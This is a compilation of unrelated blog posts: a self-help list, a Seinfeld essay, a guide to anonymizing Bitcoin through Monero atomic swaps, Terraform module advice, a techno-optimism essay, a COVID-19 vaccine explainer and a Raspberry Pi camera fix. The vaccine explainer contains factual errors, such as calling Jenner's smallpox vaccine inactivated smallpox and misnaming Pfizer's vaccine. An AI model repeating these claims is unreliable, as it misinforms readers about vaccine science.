problems is not to add something, but to remove.</p><p>Not able to lose weight? You can exercise more, or you could eat less. You don’t need to add a night time meditation routine, you only need to remove your laptop and phone from the room.</p><p>A lot of pain in life can be prevented by “avoiding” doing things.<br></p><h3>6. Inversion, or how not to do</h3><p>Here’s a simple mental model that can make your life easier to navigate. Instead of looking for “how to be a good boss”, invert the question. </p><p>Identify instead the reasons that come up when you research “how to be a bad boss”. Apply via negativa, by avoiding the attributes of a bad boss you already become a good one. </p><p>I did the same when I had taken up my last PM job, by making a list of “how to be a bad product manager” and then avoiding those things. </p><p>Sankalp and I did the same when we were hiring by researching “mistakes to avoid when hiring”.<br></p><h3>7. Common sense is not common practice</h3><p>You might think something is obvious and also common sense, but I’ve learnt that there’s a reason many things are tagged as “common sense”. The phrase is an attribute that is desirable, but not necessarily literal. </p><p>Everyone knows eating greasy food in the long term will cause heart disease. Or not hitting the gym or exercising will make your body old and creaky and unfit. It’s common sense. But, not common practice.</p><p>The most important things in life are the simple and obvious ones. And yet they are the hardest to keep following day in and day out. <br></p><h3>8. Time and energy are finite resources</h3><p>The only finite resource in your life is time and energy. And every day, you have a finite amount available to you to apply to various things. Choose carefully.<br></p><h3>9. Velocity, not speed</h3><p>I refer to this over the more commonly referred hard work vs smart work analogy.</p><p>You could be running at a 100 miles/hour but getting no where if you’re moving in circles. Speed. </p><p>Your direction, where you are headed, is more important. Only by moving in the right direction do you make real progress. Velocity.<br></p><h3>10. Treat others the way you would want to be treated</h3><p>Another of the common sense not common practice terms. It’s easy to complain about others when they treat you unfairly. Yet when the power dynamics are reversed, people often do the same treatment to others.</p><p>The real test is how you treat others when you are in a position of power.<br></p><h3>11. People don’t know what they really want</h3><p>Nobody really does. The pursuit of meaning can end with the sharp knife of nihilism. There is no meaning or purpose in life.</p><p>But while having these thoughts are crucial to self-discovery, they aren’t helpful to fixate upon.</p><p>So people create meaning, direction, structures around their life to add meaning and purpose.</p><p>Which is why I think nobody really knows what they want. It’s all made up anyway.<br></p><h3>12. Your health can’t wait</h3><p>The truth is, every day our bodies are getting slightly older.</p><p>And after 25 things start moving faster. I bet they move even faster after 30 or later. Save yourself the trouble and maintain your body from before.</p><p>It makes it that much easier to get out of bed every day, have the energy to do all the things you want during the day, and just generally feel good.<br></p><h3>13. What you eat is what your body becomes</h3><p>The food you eat literally becomes molecules in your body.</p><p>One of the simplest ways to maintain health is by focusing on your eating.</p><p>It’s fascinating to me that we eat 3-6 times/day, and yet very few people spend any time or mental bandwidth understanding food, nutrition and its role in how it shapes our body.</p><p>There are simple heuristics that can go a long way - eating fats doesn’t make you fat, sugar is a carb that affects your body similar to how alcohol does, fasting has marvellous effects on your body, the mantra for weight loss is calories in calories out, the mantra for muscle gain is reps and protein intake.<br></p><h3>14. The information you consume is what your mind becomes</h3><p>If the food you eat becomes your body, then the information you consume becomes your mind. Protect your mind as if it’s your most precious resource (it is), by filtering the sources of information that you let influence you. Even your Twitter feed is programming your subconscious without you realising it.<br></p><h3>15. How you think governs everything in your life</h3><p>If you really think about it, how you think governs your whole life.</p><p>What you eat, whether you exercise, who you date, how you treat relationships, how you learn something new, how you deal with adversity, how you treat others when you are in a position of power, how you spend your free time, how you build your business.</p><p>Everything steps from the root of your thought process, how you think.</p><p>I spent an insane amount of time in 2017-18 deliberately trying to understand my thought patterns, why I think and do the way I do, how do I actually want to be, what should I change and what should I double down upon.</p><p>You can try to do this by reading books, but the best answers will come through developing high self-awareness and doing deep self-introspection.<br></p><h3>16. Generalist skillset is a Swiss knife</h3><p>Over the past few years, I’ve followed a simple mantra to learn whatever hard or soft skills can improve my skill tree required to build successful businesses.</p><p>I visualise it like the skill tree in an RPG game. You can’t unlock and master all branches, so you have to be selective in nurturing the right set of skills.</p><p>Thanks to this mindset, I learnt how to think about product, learnt how to design, simple coding but more importantly understanding the fundamentals of tech, and now I’m learning to become a great marketer.</p><p>This Swiss Army knife is what helps me understand and imagine better ways to achieve the goals we have set to build DelightChat.</p><p>And this doesn’t just apply to entrepreneurs.</p><p>If you’re a designer, you need to understand product management and technology to understand how design fits in between.</p><p>If you’re a marketer, you need to know how to write copy or design creatives or build landing pages in addition to coming up with a marketing strategy.<br></p><h3>17. The real meta-skill is the ability to learn</h3><p>And during this journey I realised that the actual ability isn’t being able to design, or manage product, or write great copy. The real meta-skill is the ability to learn new skills as they become important in your journey. <br></p><h3>18. Don’t chase people, become valuable instead</h3><p>Whenever a friend asks me “How do I make her like me?” or similar question, my answer …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>A couple of weeks ago, me and my team made a pact that each of us will write something every weekend. What we write about depends on what influenced the individual during that week that was worth sharing with the world.<br></p><p>As it turns out, my job is to write software and most of my time during the week is spent on solving technical challenges. Sometimes I can write about these challenges and how I solved them, but sometimes I can’t because we are too early in our journey of building <a href="https://www.delightchat.io/" target="_blank">delightchat.io</a> to be able to make our core architecture decisions public. <br></p><p>So what do I write this week that will help folks reading it learn something? Here is a radical thought - what if I write about something that doesn’t have any lesson at all? Does good content always need a theme and an underlying concept that helps somebody do something better?<br></p><h3><strong>Seinfeld - a show about nothing</strong><br></h3><p>For those who are not familiar, Seinfeld was a very popular sitcom that aired from the early 90s to the late 90s and it is generally referred to as “a show about nothing”. <br></p><p>This is only a half truth because Seinfeld is actually a very well written show with intricate plots that seem random at first but tie up pretty smoothly towards the end of an episode. The real reason it is a show about nothing is because unlike other sitcoms, the episodes do not have a theme. &nbsp;There is no lesson that the characters learn and evolve as human beings, there is no hidden metaphor that teaches you morals and values of how to navigate life.<br></p><p>The show instead focuses on whimsical scenarios that the characters face as a result of being selfish and inconsiderate. The episodes involve characters getting into conflicts during their day to day interactions with friends and family and how they handle the conflict while learning absolutely nothing in the process.<br></p><h3><strong>Why I think this is important</strong><br></h3><p>Despite everything you just read about Seinfeld, this was one of the most if not the most wildly successful sitcoms of all time and every sitcom since Seinfeld tries to embody some aspect of this in their plots. If not in the main plot there are sub plots which are about people screwing up and learning nothing. And this is for the simple reason that the show was very entertaining.<br></p><p>Sometimes all we really need in life is a creative way to pass the time. We are not in a race to constantly better ourselves, become the post possible version of ourselves, learn new things and kill it in life every single day. Some days are just slow and unproductive. And these days matter because otherwise how do we value the days where we do kill it in life?<br></p><p>We are fed this notion that everyone needs to chase a goal in life and every single day must be an attempt to get one step closer to that goal. For the record, I do think we should all have something that drives us and fuels the machine that keeps us going in life, but this doesn’t mean that the machine can’t rest and do nothing once in a while. <br></p><h3><strong>Life is long</strong><br></h3><p>The phrase “life is short” is quite popular. It is meant teach folks that every day must be lived to the fullest because we are all going to die someday and the last thing we want is to miss out on anything worthwhile.<br></p><p>But if you think about it, unless everyone has a terminal disease or gets into an accident, the average life expectancy of a person is over 70 years. This seems like a long time to be able to live life to the fullest every single day! <br></p><p>Life is long enough to waste a few days on doing nothing and let the brain and the body cool off and blow some steam. Life is long enough to let a few days pass without learning something new or accomplishing something. Life is long enough to waste time reading this article even though it doesn’t teach you anything.<br></p><h3><strong>Why did I write this article?</strong><br></h3><p>If you are still reading this despite me telling you that you will learn nothing from this, it means that you were most likely just browsing the internet while looking for nothing in particular. And that’s why I wrote this article - to help you pass the time and remind you that it is completely okay to do so.<br></p><p>If by any chance you are reading this while sipping your morning coffee or having a meal, or in general while performing a pretty uneventful task, I hope I kept you engaged. This is what Seinfeld did for me.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <div><p>Monero cryptographers <a href="https://eprint.iacr.org/2020/1126.pdf" target="_blank" rel="noopener noreferrer">recently discovered</a> how to conduct “atomic swaps” between Bitcoin and Monero. This means that any two people can swap Bitcoin for Monero between them without relying on any third-party service, using only software they run themselves.</p><p>As Monero is the god of privacy coins (and the blockchain <a href="https://icryptonode.com/products/monero-icryptonode-raspberry-pi-device" target="_blank" rel="noopener noreferrer">we develop products for</a>), this naturally led to speculation that this innovation would enable Monero to become a layer-2 privacy solution for bitcoin, which is itself <a href="https://www.chainalysis.com/" target="_blank" rel="noopener noreferrer">notoriously traceable</a>.</p><p>Over the past week I have read all manner of incorrect information from uninformed commenters about if this is possible, how it will work, and what this means for Monero and Bitcoin.</p><p>Let me state clearly -</p></div>

<div><p>But it’s a Yes* (with an asterisk!). Let me explain:</p><p>Bitcoin is a public blockchain - the ledger is entirely open for analysis. This creates a perfect trail of transactions, allowing anyone to see the path of bitcoin from “freshly mined” to person A to B to C and so on. Bitcoin users who wish to maintain privacy have to do additional steps, such as using a mixing-wallet like <a href="https://www.wasabiwallet.io/" target="_blank" rel="noopener noreferrer">Wasabi</a>. Using Wasabi is an imperfect solution, has fees, and requires a relatively large amount of money to use. Another option is to trust a third-party like a centralized exchange. Either way, “breaking the chain” of bitcoin transactions to establish privacy is difficult, expensive, usually involves trusted third-parties, and is not guaranteed to maintain privacy forever as Chainalysis and similar firms become more sophisticated at tracing bitcoin transactions.</p><p>Bitcoin / Monero atomic swaps will establish privacy in a fully decentralized way - one that doesn’t rely on mixing technology or third-party trusted services. The way it will work is thus:</p><p>Alice currently owns bitcoin, but because of blockchain-analysis it’s trivial to know she purchased it at Coinbase. Fearing for her safety from an abusive ex-boyfriend, Chad, who works for the government and has access to Chainalysis software, it’s absolutely essential that Alice hides her bitcoin. Once Alice’s bitcoin is unlinked from her ownership, no one can prove she owns it, thus maintaining her personal safety.</p><p>Alice must do two trades - first, she swaps her bitcoin for an equivalent amount of Monero using an atomic swap and a counterparty she found in a decentralized exchange. She trades 1 BTC for 10 XMR.</p><p>Next, Alice swaps her XMR back to BTC. The market moved against her slightly - she now trades 10 XMR for 0.99 BTC, plus a small amount for network fees. Alice ends up with 0.9895 BTC.</p><p>Now, Alice has bitcoin that cannot be traced to her identity - she “broke the chain” that linked the purchase to her own identity. Alice never had to speak to anyone or trust any third-party service for doing so. She did work with two counterparties (trades from BTC to XMR and then XMR to BTC), but had no knowledge of who they were and never spoke with them, relying on software to conduct the swap peer-to-peer. She could not be scammed - provided she agreed with the trade amounts, it was mathematically impossible for her to lose her money at any step of the way - that’s why this is “trustless”.</p><p>Now, Alice has bitcoin she can save or spend anonymously. If she ever has a reason to anonymize more bitcoin, she can use the same steps to convert unsafe bitcoin to safe bitcoin, using the Monero blockchain as a privacy layer. Her wealth is now safe from Chad, the government rapist.</p></div>
<h2>Risks of Bitcoin to Monero Atomic Swaps</h2>
<div><p>As mentioned previously, <strong>Alice cannot be scammed using atomic swaps</strong>. Mathematics will perfectly protect her from a counterparty that tries to steal her money.</p><p>The biggest risk to Alice comes from <em>time</em> - the longer she waits, the less likely blockchain analysis will be able to track her, but the more likely the price will move against her.</p><p>Why is waiting important? Just like with <a href="https://tornado.cash/" target="_blank" rel="noopener noreferrer">tornado.cash</a>, if Alice were to quickly swap into XMR and back out into BTC, there will likely be few or no swaps other than her’s. This would make it probabilistically quite likely that the second BTC output is Alice’s. Alice should wait for several other swaps to occur before she executes her swap back into BTC.</p><p>Another risk is in the size of outputs. If Alice swaps 9.347 BTC into XMR, then swaps 9.347 back out, it’s highly likely it’s her’s.</p><p>Therefore, Alice should 1) Wait a while holding XMR (hours or days), and 2) make several, staggered transactions back into BTC from XMR. The biggest danger here is the price of Monero moving against Bitcoin, but it will likely be worth it to maintain privacy.</p><p>I anticipate that services will be created that make anonymizing Bitcoin simple and safe using standard output amounts (0.1, 1.0, 10.0 BTC, etc.) similar to tornado.cash.</p><p>One final note - I assume that chain-analysis can determine which bitcoin outputs are used for Monero atomic swaps. Given that the Bitcoin script used for the 2-of-2 Bitcoin locks is extremely specific, I assume that all Bitcoin UTXOs used for Monero swaps will be tracked. If Monero researchers find a way to obfuscate all atomic swap transactions among normal transactions, privacy can be greatly increased. But given the amount of intense research this solution will inevitably attract, it is unlikely “hiding among the crowd” will be possible. This is also why waiting after a swap will be extremely important.</p></div>
<h2>Conclusion</h2>
<p>Monero can indeed be used as a layer-2 privacy solution for Bitcoin. It is not perfect, and risks with timing and transaction size can compromise privacy. But Monero is currently the only trustless, fully-decentralized solution for enhancing privacy on Bitcoin and I anticipate that it will become extremely popular.

<![CDATA[Practices for Better Terraform Module]]>

October 24, 2020 | https://deeeet.com/posts/practices-for-better-terraform-module/ | <a href="https://web.archive.org/web/*/https://deeeet.com/posts/practices-for-better-terraform-module/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
      <p>I’ve been working at the internal platform team at Mercari for 3 years. In that team, we’ve developed and provided the special Terraform module, which bootstraps required infrastructure and SaaS services for building one microservice, to internal developers (See more details on <a href="https://speakerdeck.com/b4b4r07/terraform-ops-for-microservices">Terraform Ops for Microservices</a>). Now, this module is used by more than 400 services (since we create both development and production environments, actually it’s 800) and we’ve released the module more than 30 versions.</p>
<p>This blog post introduces some of the practices we developed while working on that Terraform module. “Better”, in this context means, <em>from the module user’s point of view</em>, easier to use and easier to maintain for a long period of time. Since the practices are very high level, some of them can be applied not only for the internal Terraform module but also for the public one and other software development like <a href="https://kubernetes.io/docs/concepts/extend-kubernetes/api-extension/custom-resources/">Kubernetes CRD</a> and so on…</p>

<p>When designing the Terraform module, the first and most important thing you need to aware of is the variable of the Terraform module is API. Once you define a variable in your module definition, it’s open to users and target to modification. This means it becomes an interface between users and your module. In this sense, you can think of it as API.</p>
<p>Since it’s API, what kind of variables you define decides the complexity and the usability of your module. But, fortunately, many practices have been developed for good API design in this industry. The followings are some of the practices from them and I think it’s important for Terraform module design.</p>
<h2 id="module-should-be-deep">Module should be deep</h2>
<p>The Terraform module is an abstraction of the collection of the raw Terraform resources. An abstraction, in general, is a simplified view of any entity, which omits unimportant details. We create a module to make it easier for your users to think about and manipulate complex resources.</p>
<p><img src="https://user-images.githubusercontent.com/1256183/96132088-eafb8400-0f34-11eb-90d1-3eebabfadf38.png" alt="Philosophy"></p>
<p>The best modules are those that provide powerful functionality yet have a simple interface. In the book, <a href="https://www.amazon.com/dp/B07N1XLQ7D">A Philosophy of Software Design</a> calls this “Deep module” (The word “module” is used for different context and not about Terraform module but you can think of them same). You can see the visualized notion of this above. “Deep” means they have lots of functionality hidden behind a simple interface. On the other hand, “Shallow module” is one whose interface is relatively complex in comparison to the functionality that provides (does not hide much complexity).</p>
<p>The module’s interface represents the complexity of that module imposes to the user: the smaller and simpler the interface, the less complexity that it introduces. When designing your Terraform module, always think about the depth of it.</p>
<p>Be careful that once you open your interface and it’s used by users, you can not change or delete it easily.  And it may be used in an unexpected way (See <a href="https://www.hyrumslaw.com/">Hyrum’s Law</a>). So what variable to expose is really important.</p>
<p>You can more learn about interface design from e.g., <a href="https://increment.com/apis/consider-the-interface-api-redesign/">Consider the interface</a>.</p>
<h2 id="interface-should-be-intuitive">Interface should be intuitive</h2>
<p>The module interface = <code>variable</code> should be intuitive to use. What happens when changing the variable should be obvious and predictable to your users. Don’t surprise your users. For example, avoid using the <code>enable_x</code> variable for enabling features not related to x.</p>
<p>Using consistent naming and format in the same module is also important to make it intuitive. For example, if the module uses the <code>enable_x</code> variable for enabling feature “x”, then enabling “y” should be also done by the <code>enable_y</code> variable, not by <code>setup_y</code> or <code>use_y</code>.</p>
<h2 id="variable-should-have-smart-default">Variable should have smart default</h2>
<p>The module variable should have a smart default value which covers 80% of users. The smart value means the best value in a limited context. The module which can be used without any configuration is the best (It also related to the upgrading strategy below). You should design carefully what default value it should have.</p>
<p>But, at the same time, it should have configuration knobs for the power users. Normally, you have the power users who can not use the module like the 80% of normal users. For such users, you should prepare ways of changing the behavior of the module. This knob should be designed properly and avoid having a shallow interface.</p>

<p>Upgrading is one of the most critical tasks of long-developing software. But, at the same time, it’s also the most bothering task. This is also true for the Terraform module, especially which is for the general purpose and widely used… It’s been huge problem for our Terraform module, too.</p>
<p>Since normally new features are added to the latest version, if you want your users to use the feature, you need to ask them to upgrade it. To make it works, upgrading must be easy as possible and less cost to users.</p>
<p>To make upgrading easy, <em>keeping backward compatibility</em> is most important. In the case of the Terraform module, if there is no Terraform state diff when upgrading the module version, it keeps backward compatibility. If there is no state diff, users do not need to care about anything when upgrading. So the best upgrading is no Terraform state diff.</p>
<p>The following practices are the idea of achieving this and reducing the cost of upgrading.</p>
<h2 id="new-functionality-should-be-off-by-default">New functionality should be off by default</h2>
<p>If you want to introduce new functionality to your module, you should make the feature “off” by default. It should be explicitly “on” by the users who want to use it.</p>
<p>Sometimes, you want to enforce all your users to use some features by default. Even in that case, you should do it gradually. When introducing, it should be “off” by default. Then you should ask users to enable it explicitly. After the feature adaption rate is increased (you should monitor it), then you can make it “on” by default. With this, you can reduce the effect of upgrading.</p>
<h2 id="upgrading-should-be-automated">Upgrading should be automated</h2>
<p>In other words, prepare <a href="https://dependabot.com/">dependabot</a> for your module. Especially, if you update the module frequently, you must prepare it. Even if you ask your users to upgrade, normally they don’t work on because normally they have more important tasks to do. We struggled with this a lot. So, instead, create PRs for them.</p>
<p>Internally, not only we send PRs of new version upgrading, but also we have the mechanism to automatically merge the PR if there is no Terraform diff. With the combination of this and <em>keeping backward compatibility</em> practice, we can increase the rate of users who use the latest version of the module.</p>
<h2 id="state-diff-should-be-small-as-possible">State diff should be small as possible</h2>
<p>It’s not possible to make upgrading no state diff always. Sometimes you need to introduce breaking changes e.g., because of changes in dependent resources or security issues needed to be patched as soon as possible.  In that case, you must think about how to reduce the cost. If the state diff is less, then the cost of upgrading is less. The more you include diff, the fewer chances users upgrade it.</p>
<p>When introducing the breaking changes, you must tell it by the documentation. The documentation can be <a href="https://keepachangelog.com/en/1.0.0/">CHANGELOG</a> or your user guides. If the documentation clearly describes the changes or the actions users need to take, the cost of upgrading decreases. For example, if the documentation shows what kind of state diff is expected in the documentation, the users can upgrade it without fear.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main" role="main"> <article role="article">  <p>What do I want the future to be like? What amazing inventions do I want to see, and help build in my lifetime? I realized this morning that I don’t know. I was shocked.</p> <p>I’ve been tinkering with technology since I was a child, and I’ve been investing in early-stage companies for the past five years. More than sixty bets on the future. I’m meant to have bold visions of a better world, theses I support, and capital that I allocate in a technologically optimistic way. I began investing in startups because I wanted to help shape the future. And while I still get excited talking to founders with bold ideas, I have none of my own.</p> <p>When I was a teen, growing up on a diet of Carl Sagan’s Cosmos and Alvin Toffler’s Futurism, I had plenty of big ideas: spaceflight, supersonic travel, mag-lev trains, geodesic domes, bio-nanotech for longevity, and social organization to provide maximum freedom for all. Cheesy, but optimistic.</p> <p>Now I am 29 and I have no big, optimistic ideas. I think of plenty of arbitrages and improvements in efficiency. And while I believe that better infrastructure enables more construction and innovation, closing an obscure pricing gap just isn’t like dreams of great adventure and exploration on the frontier of human experience and possibility.</p> <p>I spend much time thinking about solutions to existing problems – the incentive mismatch in mass media that is causing accelerating polarization, how to remedy the effects of climate change, and so on. But these are all <em>fixes</em>, reactions. It feels like I’m in the belly of the ship, frenetically plugging leaky holes, never even having the space of mind to think <em>where the ship should go</em>. Ostensibly, those decisions are made on the bridge of the ship, which, in October 2020, seems to be populated by well-intentioned individuals, but hamstrung in their ability to make good collective decisions.</p> <p>Recent years have shown me how difficult it is to make <em>any</em> meaningful public decision. Every debate is endlessly contentious, every subject has meaningful nuance, and every decision has exceedingly hard-to-predict second-order-effects. The world is much more complex than it was even twenty years ago, and the effects are paralyzing. This is clearly felt among policymakers, but I feel it even as a technologist: I understand that virtually all tools can be used – and more often than not, <em>will</em> be used – for both good and evil, and how hard the results are to predict over years in our dynamic world. I learned that technology can rarely solve fundamental social problems, and I’ve seen the public perception rollercoaster of “this technology/person/policy is good” to “this is evil” more times than I can count.</p> <p>This puts me in a real bind for having high-conviction views that aren’t microscopically focused. As an example, for the past few years I have struggled developing a long-term view on bitcoin. By network effect, I think it is clear that in the long term, we will have <em>either</em> fiat or crypto – either fully centralized or fully decentralized – not both. Which world do I want to live in? I’m not sure. On the one hand, it is clear that our existing US financial system is fragile with systemic risk, a playball exposed to potentially irresponsible governance. You might call its mechanics unfair to the masses, but you’d also need to point out that it has <em>actually worked</em> in creating prosperity over the past 110 years. (And, comparing the US to other countries, it has worked remarkably well!) I agree with need for overhaul of the system, but I’m not sure if it’s wise throw out the entire thing and open up the world’s largest power vacuum in the process. This rarely ends well. I cannot tell, with intellectual honesty, which avenue is best to pursue. I doubt that anyone does.</p> <p>Other arenas of big problems and changes yield similar dilemmas. Perhaps consequently, I have found myself not dreaming big anymore. I dream small, where the effects are predictable. On dreaming big, there is the paralysis of responsibility and effects, but there is also a level of cynicism that has come to me over the years, as big dreams turn out to be much more fraught and complicated as they move into reality. The nuance, complexity, difficulty, responsibility, and often <em>irreversibility</em> in effecting big changes has slowly removed the stars from my eyes as I look at technology. Maybe that’s a good thing as I come to appreciate the gravity of change.</p> <p>But at the same time, if we don’t take big, bold, bets, we’ll be forever stuck in the valleys of local optima. As Bezos says, the size of your risk-taking should increase with the size of your enterprise – at scale, we should be taking many daring gambles, all the time. But it doesn’t feel like that’s really happening. It feels like we spend lots of effort debating marginal nuance, sitting in the belly of the ship doing maintenance, rather than charting the course forward.</p> <p>It is difficult to be an optimist in 2020. I admire the few<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">1</a></sup> that still have the courage to dream big and to remind ourselves that there <em>is</em> a future that could be amazing and that is worth fighting for.</p>  <hr>  <br> </article> </div></div>]]>

<p>While COVID-19 case counts continue to rise, the race for a vaccine is heating up, with several candidates looking very promising for FDA approval in the next few months.  </p>



<p>Now, more than ever, it’s important to learn about the science behind the COVID-19 vaccines and stay up-to-date with the most recent news in the race for a vaccine for the novel coronavirus.  Read on to learn more about several of the most promising vaccines and how they work.  </p>



<p>This page is a collaboration between Fancy Comma, LLC and Nidhi Parekh of <a href="http://www.thesharedmicroscope.com/">The Shared Microscope</a>.  For the most up-to-date vaccine news and updates, subscribe to <a href="https://thesharedmicroscope.com/covid-19/">The Shared Microscope’s COVID-19 vaccine newsletter</a>.</p>



<h2>Everything You Need to Know about the Most Promising COVID-19 Vaccines and How They Work</h2>



<p>The most promising COVID-19 vaccines under development are categorized into four vaccine types: <strong>messenger RNA (mRNA) vaccines</strong>, <strong>viral vector vaccines</strong>, <strong>protein subunit vaccines</strong>, and <strong>inactivated vaccines</strong>.</p>



<p>Keep reading to learn more about each vaccine subtype, as well as the most exciting vaccines under development for each subtype.</p>



<h2>1. COVID-19 mRNA Vaccines</h2>



<p>The mRNA vaccines under development for COVID-19 include the Moderna and Pfizer/BioNTech vaccines.  Both of these rely on genetic material called mRNA (short for messenger RNA) in order to stimulate the body’s cells to generate antibodies which can neutralize SARS-CoV-2, the virus that causes COVID-19 infection.</p>



<p>Nucleic acid vaccines, which refer to vaccines that contain either DNA or RNA, have never been used on the market, so COVID-19 presents a unique “<a href="https://cen.acs.org/pharmaceuticals/vaccines/coronavirus-help-mRNA-DNA-vaccines/98/i14">make or break moment</a>” for mRNA vaccines.  </p>



<p>Both the Moderna and Pfizer/BioNTech vaccines are comprised of mRNA enclosed in tiny nanoparticles.  This mRNA contains instructions for the body to create only the part of the SARS-CoV-2 virus that causes COVID-19 infection — not the entire virus.  The spike proteins are depicted in red in the (by now) iconic photo of the SARS-CoV-2 virus below:</p>

<p>The SARS-CoV-2 spike protein uses its spiky features to get into human cells, where it can instruct our cells to make more copies of itself.  This replication is what causes COVID-19 infection.  Without the spike protein, the virus cannot get into our cells.  So, mRNA vaccines work by giving our bodies the instructions to create the spike proteins.  The mRNA is read into our cells to produce the actual spike proteins — but just the spike proteins, not the virus itself.</p>

<p>The idea behind the mRNA COVID-19 vaccine is that it gives our bodies the genetic instructions to produce antibodies to the viral spike protein.  This “trains” our bodies to recognize and neutralize the spike proteins. The next time the novel coronavirus enters the body, the immune system will work quickly to neutralize it before it can cause a COVID-19 infection.</p>



<p>Let’s learn more about the two most promising COVID-19 mRNA vaccines below.</p>



<h3>Moderna’s mRNA Vaccine for COVID-19</h3>



<p>Moderna Therapeutics is a biotechnology company headquartered in Cambridge, MA, USA.  Their vaccine (mRNA-1273) has the shortest development time of all the vaccines in Operation Warp Speed, with a mere 42 days from mRNA sequence selection to clinical trials.  Moderna’s vaccine was also the first vaccine to begin clinical trials in the United States.  </p>

<h3>Pfizer/BioNTech mRNA Vaccine for COVID-19</h3>



<p>Though a latecomer to <a href="https://www.hhs.gov/coronavirus/explaining-operation-warp-speed/index.html">Operation Warp Speed</a>, the large-scale U.S. government-sponsored initiative to get a COVID-19 vaccine on the market, the Pfizer/BioNTech vaccine clinical trial is currently the largest Phase 3 clinical trial.  This vaccine (called BNT1262b2) may also be one of the first to obtain FDA approval — the Pfizer CEO, Albert Bourla, has repeatedly <a href="https://www.biospace.com/article/pfizer-ceo-anticipates-eua-for-vaccine-in-late-november/">stated</a> that he is committed to bringing a vaccine to market by the end of 2020.</p>



<p>Like the Moderna vaccine, the Pfizer/BioNTech is an mRNA vaccine.  Learn more about <a href="https://fancycomma.wordpress.com/2020/09/20/pfizer-biontech-covid-19-vaccine/">how the Pfizer/BioNTech mRNA vaccine works</a>.</p>

<h2>2. Viral Vector Vaccines for COVID-19</h2>



<p>Viral vector vaccines are a “mashup” of the SARS-CoV-2 virus as well as another virus.  The second virus acts as a delivery vehicle for the virus into the body. The two most promising viral vector vaccines at this time are developed by Oxford/AstraZeneca and Johnson &amp; Johnson.</p>



<h3>Oxford/AstraZeneca Viral Vector Vaccine</h3>



<p>The technology for this vaccine was initially developed by the Jenner Lab at Oxford University and was not specifically designed for COVID-19.  However, shortly after the pandemic, the Oxford researchers shifted priorities to quickly develop a COVID-19 vaccine.  In this process, they also welcomed biotech giant AstraZeneca to the research program to assist with clinical testing and production.</p>



<p>This vaccine is a viral vector — a “mashup” of a small segment of the SARS-CoV-2 virus and a chimpanzee adenovirus.  The viral vector has been cut-and-pasted together in the laboratory.  It is not capable of making more copies of itself; its only purpose is to deliver the SARS-CoV-2 genetic material into our bodies so that our cells can produce the viral spike protein.  This way, our bodies develop immunity to the spike protein so that, when another SARS-CoV-2 virus comes around, we will be able to rapidly neutralize the virus by identifying and breaking down the spike proteins.  This is the mechanism by which the Oxford/AstraZeneca vaccine prevents the virus from entering our cells to make copies of itself and cause a COVID-19 infection. </p>

<h2>4. Inactivated Virus Vaccines</h2>



<p>Inactivated virus vaccines are made by using heat or chemicals to kill the virus.  Because inactivated vaccines do not contain live virus, they cannot cause disease.</p>

<p>They are the oldest type of vaccine, dating back to the late 18th century when the father of immunology, Edward Jenner, developed a vaccine made of inactivated smallpox which helped the world eradicate this very serious and devastating disease.</p>



<h3>Sinovac’s CoronaVac Inactivated Virus Vaccine for COVID-19</h3>



<p>While not part of Operation Warp Speed, Chinese biotech company Sinovac has developed the most successful inactivated virus vaccine currently in clinical trials.  The vaccine, called CoronaVac, contains a killed version of the SARS-CoV-2 virus.  When introduced into the body, this inactivated virus can facilitate antibody production without causing disease.</p>

        <h3>Fixing Camera Freezes on the Raspberry Pi PiCam Module</h3>
        
        
        </div>
      
      <p><img img="" src="https://diode.io/images/blog/pi/camera1.jpg" alt="Article Blog Image">
      </p>
      
    </div><div>
      <p>Keeping your Raspberry Pi Video project up and running 24/7 can be quite a task. With the <a href="https://diode.io/download">Diode Client</a> you have always access from everywhere and can easily share it’s video stream. In our previous Raspberry Pi post we focused on the <a href="https://diode.io/raspberry%20pi/running-forever-with-the-raspberry-pi-hardware-watchdog-20202/">built-in watchdog</a> to keep survive hardware errors. But what do you do if the video fails on you?</p>

<p>There are different tools you can use to capture pictures from your Raspberry Pi Cam versions 1 and 2. The most common are <a href="https://www.raspberrypi.org/documentation/raspbian/applications/camera.md">raspistill and raspivid</a>. In our demo deployments we’re using <em>raspivid</em> to stream the live video to a local port and expose that through <a href="https://pi-taipei.diode.link/">Diode to the public</a>.</p>

<p>The command we use is this:</p>

<div><div><pre><code>raspivid <span>-awb</span> auto <span>-t</span> 0 <span>-w</span> 320 <span>-h</span> 180 <span>-fps</span> 12 <span>\</span>
    <span>-ae</span> 16,0x77 <span>-a</span> 12 <span>-a</span> <span>"%X %m/%d/%Y"</span> <span>-ifx</span> saturation <span>\</span>
    <span>-ex</span> auto  <span>-n</span> <span>-l</span> <span>-o</span> tcp://127.0.0.1:3030 <span>-pf</span> baseline
</code></pre></div></div>

<p><img src="https://diode.io/images/blog/pi/video1.jpg" alt="alt_text" title="Live stream"></p>

<p>But sometimes we found that the stream would stop and show error messages like this in the logs:</p>

<div><div><pre><code>@07/25/2020 21:14:20 [EROR] Failed to connect local: dial tcp [::1]:3030: connect: connection refused server=europe.testnet.diode.io:41046

</code></pre></div></div>

<p>And in the logs of <code>raspivid</code>:</p>

<div><div><pre><code>mmal: Failed to write buffer data (228 from 325)- aborting
</code></pre></div></div>

<p>At the same time the camera would indicate with a red light that it’s still recording, but no more picture data is coming…</p>

<h2 id="videocore">VideoCore</h2>

<p>The Raspberry Pi distribution comes with both the <em>OS kernel</em> as well as a <em>VideoCore firmware</em> for it’s camera. This firmware is what can cause this problem.</p>

<p>Luckily it can easily be updated. In our cases we found that just ensuring that the most recent stable version is installed solved for us the red led of death.</p>

<p>And this is what you do on ther Raspberry:</p>

<div><div><pre><code>sudo apt-get update
sudo apt install --reinstall libraspberrypi0 libraspberrypi-{bin,dev,doc} raspberrypi-bootloader raspberrypi-kernel
</code></pre></div></div>

<p>The reinstall option forces reinstallation of the packages which will in turn ensure that the VideoCore firmware is updated in the hardware.</p>

<p>If you got any troubles with your Pi or running Diode on the Pi feel free to reach out to us on <a href="https://t.me/diode_chain">Telegram and ask questions directly there.</a></p>

<p>And if you want to learn more about Diode be sure to check out the <a href="https://github.com/diodechain/wiki/wiki/FAQs">Diode FAQs</a>.</p>

<![CDATA[A simpler approach to bookmarks]]>

